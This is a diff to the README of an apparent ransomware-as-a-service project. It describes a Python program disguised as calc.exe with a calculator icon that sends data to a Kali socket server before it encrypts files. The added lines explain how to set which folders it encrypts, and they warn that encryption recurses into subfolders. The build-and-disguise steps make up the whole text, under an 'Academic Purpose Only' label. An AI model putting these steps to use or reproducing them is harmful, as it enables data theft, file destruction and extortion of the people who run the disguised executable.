@@ -2,7 +2,7 @@
 A simple python script pretending calc.exe to trigger user execute a ransomeware and sent data before encrypt.
 Deployed on Windows environment.
 
-## Academic Purpose Only ##
+## **Academic Purpose Only**
 
 # Flow #
 - Execute socket_server.py on your Kali
@@ -10,3 +10,7 @@ Deployed on Windows environment.
 - Run autopytoexe convertor the program as a exe
 - Replace Icon to calculator.ico
 - Output as a exectuable file
+
+# Change infecting area #
+- Lines 28 on raas.py Filenames = glob.glob("./Path You Want to encrypt/*")
+- **Be careful encryption will recursively in all subfolder**
